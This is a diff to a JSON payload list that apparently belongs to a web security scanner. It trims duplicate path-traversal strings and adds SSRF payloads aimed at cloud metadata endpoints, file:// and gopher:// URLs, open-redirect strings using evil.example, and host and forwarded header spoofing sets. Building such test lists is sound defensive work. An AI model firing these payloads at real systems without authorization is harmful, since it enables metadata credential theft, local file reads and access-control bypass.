@@ -86,19 +86,15 @@
       "..%2f..%2f%2e%2e%2fetc%2fpasswd",
       "../../etc/passwd%00.jpg",
       "../../etc/passwd..;/",
-      "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
       "..%2f..%2f..%2f",
-      "/etc/passwd%00",
       "%252e%252e/%252e%252e/%252e%252e",
       "%252e%252e%252fetc%252f",
       "..%c0%af..%c0%af",
       "..%e0%80%af",
       "..%c1%9c..%c1%",
       "././././",
-      "././././",
       "././",
       "./",
-      "../../../../",
       "../../../../",
       "../../",
       "../",
@@ -206,7 +202,25 @@
   ],
   "ssrf_payloads": [
     "http://localhost",
-    "http://127.0.0.1"
+    "http://127.0.0.1",
+    "http://[::1]",
+    "http://localhost.localdomain",
+    "http://0.0.0.0",
+    "http://127.1",
+    "http://127.0.1.1",
+    "http://2130706433",
+    "http://host.docker.internal",
+    "http://10.0.0.1",
+    "http://192.168.0.1",
+    "http://172.16.0.1",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/user-data",
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/computeMetadata/v1/",
+    "file:///etc/passwd",
+    "file:///C:/Windows/win.ini",
+    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0a%0d%0a",
+    "dict://127.0.0.1:11211/"
   ],
   "nosql_error_keywords": [
     "mongodb",
@@ -430,10 +444,7 @@
   "graphql_introspection_query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name } directives { name description locations args { name description type { kind name } defaultValue } } } }",
   "directory_traversal_payloads": [
     "././{FILE}",
-    "././{FILE}",
     "./././{FILE}",
-    "./",
-    "././",
     "./",
     "././",
     "./././",
@@ -463,5 +474,47 @@
     "'/**/OR/**/1=1--",
     "'/*!50000OR*/1=1--",
     "'%20OR%201=1--"
+  ],
+  "open_redirect_payloads": [
+    "https://evil.example",
+    "//evil.example",
+    "///evil.example",
+    "https:%2f%2fevil.example",
+    "https%3a%2f%2fevil.example",
+    "%2f%2fevil.example",
+    "\\\\evil.example\\",
+    "/\\evil.example",
+    "https://evil.example/%2e%2e"
+  ],
+  "host_header_payloads": [
+    "evil.example",
+    "evil.example:443",
+    "127.0.0.1",
+    "localhost",
+    "internal.service"
+  ],
+  "forwarded_header_sets": [
+    {
+      "X-Forwarded-Host": "evil.example"
+    },
+    {
+      "X-Forwarded-Proto": "http"
+    },
+    {
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    {
+      "Forwarded": "for=127.0.0.1;proto=http;host=evil.example"
+    },
+    {
+      "X-Original-URL": "/admin"
+    },
+    {
+      "X-Rewrite-URL": "/admin"
+    }
+  ],
+  "graphql_extra_queries": [
+    "query { __typename }",
+    "query { __schema { types { name kind } } }"
   ]
 }
